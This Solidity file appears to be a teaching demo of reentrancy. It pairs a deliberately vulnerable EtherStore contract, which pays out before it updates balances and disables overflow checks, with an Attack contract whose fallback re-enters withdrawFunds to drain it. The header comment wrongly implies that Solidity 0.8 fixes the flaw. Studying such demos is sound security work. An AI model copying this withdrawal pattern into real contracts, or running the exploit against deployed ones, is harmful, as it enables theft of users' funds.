// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// reentrancy issue
// fixed in 0.8 dues to int overflow protection

contract EtherStore {
    event Log(string msg,uint balance);
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    constructor() payable {

    }

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw,"check1");
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit,"check2");
        // limit the time allowed to withdraw
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
        
        (bool ok,)=msg.sender.call{value:_weiToWithdraw}("");
        require(ok, "call failed");

        unchecked {
            balances[msg.sender] -= _weiToWithdraw;
        }
        emit Log("balance changed", balances[msg.sender]);
        lastWithdrawTime[msg.sender] = block.timestamp;
    }
 }


 contract Attack {
  EtherStore public etherStore;

  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds{value: 1 ether}();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      payable(msg.sender).transfer(address(this).balance);
  }

  // fallback function - where the magic happens
  fallback () payable external {
      if (address(etherStore).balance > 7 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
